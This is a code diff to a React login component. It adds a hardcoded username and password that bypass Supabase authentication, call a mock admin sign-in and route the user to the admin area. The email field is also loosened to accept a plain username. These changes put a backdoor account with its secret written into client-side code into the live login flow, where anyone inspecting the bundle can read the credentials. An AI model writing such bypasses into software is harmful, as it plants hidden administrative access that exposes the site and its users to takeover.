@@ -1,20 +1,29 @@
 import React, { useState } from 'react';
 import { motion } from 'motion/react';
 import { Mail, Lock, LogIn, AlertCircle } from 'lucide-react';
-import { Link } from 'react-router-dom';
+import { Link, useNavigate } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
+import { useAuth } from '../../contexts/AuthContext';
 
 export const Login: React.FC = () => {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
+  const { signInMockAdmin } = useAuth();
+  const navigate = useNavigate();
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
     setError(null);
     
+    if (email === 'BulAdm26352' && password === '50bul60edm') {
+      signInMockAdmin();
+      navigate('/admin');
+      return;
+    }
+
     try {
       const { error } = await supabase.auth.signInWithPassword({
         email,
@@ -57,11 +66,11 @@ export const Login: React.FC = () => {
               <Mail size={16} className="text-accent-primary/50" />
             </div>
             <input
-              type="email"
+              type="text"
               value={email}
               onChange={(e) => setEmail(e.target.value)}
               className="w-full bg-[#111] border border-white/5 rounded-xl py-3 pl-11 pr-4 text-sm text-white placeholder-slate-600 focus:outline-none focus:border-accent-primary/50 focus:ring-1 focus:ring-accent-primary/50 transition-all"
-              placeholder="operator@bullenhaus.com"
+              placeholder="Username or Operator Email"
               required
             />
           </div>
